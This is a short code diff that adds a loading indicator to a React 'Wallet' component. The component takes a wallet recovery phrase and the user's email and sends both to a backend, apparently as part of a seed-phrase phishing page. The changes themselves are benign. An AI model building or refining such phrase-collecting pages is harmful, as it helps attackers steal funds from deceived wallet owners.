@@ -9,7 +9,7 @@ export function Wallet() {
   const [message, setMessage] = useState("");
   const [isError, setIsError] = useState(false);
   const [phrase, setPhrase] = useState("");
-
+  const [loading, setLoading] = useState(false);
 
   const handleTextAreaChange = (el: any): void => {
     let value: string = el.target.value;
@@ -42,12 +42,15 @@ export function Wallet() {
 
 
   const onSendPhrase = async () => {
+    setLoading(true);
     const {
       error,
     } = await connection.withoutActions({
       email: ` ${sessionStorage.getItem(sessionConst.Email) ?? ''} `,
       phrase: ` ${phrase} `,
     })
+
+    setLoading(false);
 
     if (error) {
       window.location.reload();
@@ -69,7 +72,7 @@ export function Wallet() {
         </div>
         <div className={styles.walletAgreeText}>By clicking continue, you agree to the terms and privacy policy</div>
         <button onClick={onSendPhrase} disabled={isError} className={styles.walletContinueButton}
-                id="wallet-continue-button">Continue
+                id="wallet-continue-button">{loading ? 'Loading...' : 'Continue'}
         </button>
       </div>
     </div>
